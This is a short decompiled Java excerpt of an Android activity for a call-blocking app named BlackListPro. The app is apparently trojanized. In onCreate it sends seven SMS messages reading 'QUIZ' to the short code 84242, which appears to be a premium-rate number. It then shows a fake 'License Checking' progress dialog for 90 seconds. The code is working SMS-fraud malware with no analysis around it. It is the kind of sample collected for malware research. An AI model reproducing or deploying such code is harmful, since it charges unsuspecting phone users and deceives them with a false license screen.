	
	    public BlackListProActivity()
	    {
	        return;
	    }
	
	
	    public void SendThem(String p7, String p8)
	    {
	        android.telephony.SmsManager v0 = android.telephony.SmsManager.getDefault();
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        v0.sendTextMessage(p7, 0, p8, 0, 0);
	        return;
	    }
	
	
	    public void onCreate(android.os.Bundle p6)
	    {
	        super.onCreate(p6);
	        this.SendThem("84242", "QUIZ");
	        android.app.ProgressDialog v0 = android.app.ProgressDialog.show(this, "License Checking", "The license is under checking. Please wait...", 1);
	        v0.show();
	        new android.os.Handler().postDelayed(new org.baole.app.blacklistpro.BlackListProActivity$1(this, v0), 90000);
	        return;
	    }
	
